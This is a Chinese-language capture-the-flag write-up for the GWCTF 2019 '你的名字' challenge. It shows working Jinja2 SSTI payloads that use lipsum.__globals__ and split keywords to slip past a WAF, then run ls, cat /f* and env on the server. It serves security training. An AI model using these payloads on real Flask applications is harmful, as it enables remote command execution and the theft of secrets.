## 基本信息
- 题目名称：GWCTF 2019-你的名字
- 题目链接：https://www.nssctf.cn/problem/259
- 考点清单：SSTI、flask
- 工具清单：Yakit
- payloads：lipsum绕过waf

### 解题思路  

题目给出一个输入框，输入的内容会被回显。  

![](images/GWCTF%202019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97-regression.png)  

然而，当我们输入 `{{7*'7'}}` 时，页面返回了一个错误：  

![](images/GWCTF%202019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97-error.png)  

错误信息提到的是 `test.php`，但这让人有些疑惑，因为网页指纹显示的是 Python 环境：  

![](images/GWCTF%202019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97-fingerprint.png)  

为了进一步分析，我使用 Fuzz 测试，发现双大括号 `{{ }}` 被过滤，同时还有一些常见关键字，如 `os`、`request` 等也被拦截。  

![](images/GWCTF%202019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97-fuzz.png)  

### 过程和结果记录  

这道题的关键在于绕过 WAF 的限制。经过Fuzz字典爆破分析，发现题目没有过滤`lipsum`。

于是构造了如下 payload 来绕过双大括号过滤：  

```
{%print (lipsum.__globals__['o''s']['po''pen']('ls').read()) %}
```  

成功执行后，我们看到命令 `ls` 被执行，并返回了文件列表：  

![](images/GWCTF%202019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97-ls.png)  

接着，我们尝试查看根目录下的 flag 文件，使用如下命令：  

```
{%print (lipsum.__globals__['o''s']['po''pen']('cat /f*').read()) %}
```  

输出结果显示 `hello see environ !`，提示我们查看环境变量：  

```
{%print (lipsum.__globals__['o''s']['po''pen']('env').read()) %}
```  

最终，通过该命令，我们成功列出了环境变量：  

![](images/GWCTF%202019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97-flag.png)

### 总结

- 在解决SSTI题目时，利用Fuzz测试是一种高效的方法，能够快速识别被过滤的关键字，帮助确定绕过WAF的策略，从而节省大量时间。
- 务必注意出题者可能设置的迷惑性提示信息，错误的报错信息或异常返回往往是干扰的关键，不能盲目相信表面信息。
- 使用 `lipsum` 模块的 `__globals__` 属性成功绕过了WAF的关键字限制，是一种值得借鉴的技巧。类似的变形和关键字拼接方法常见且实用，值得深入研究和掌握。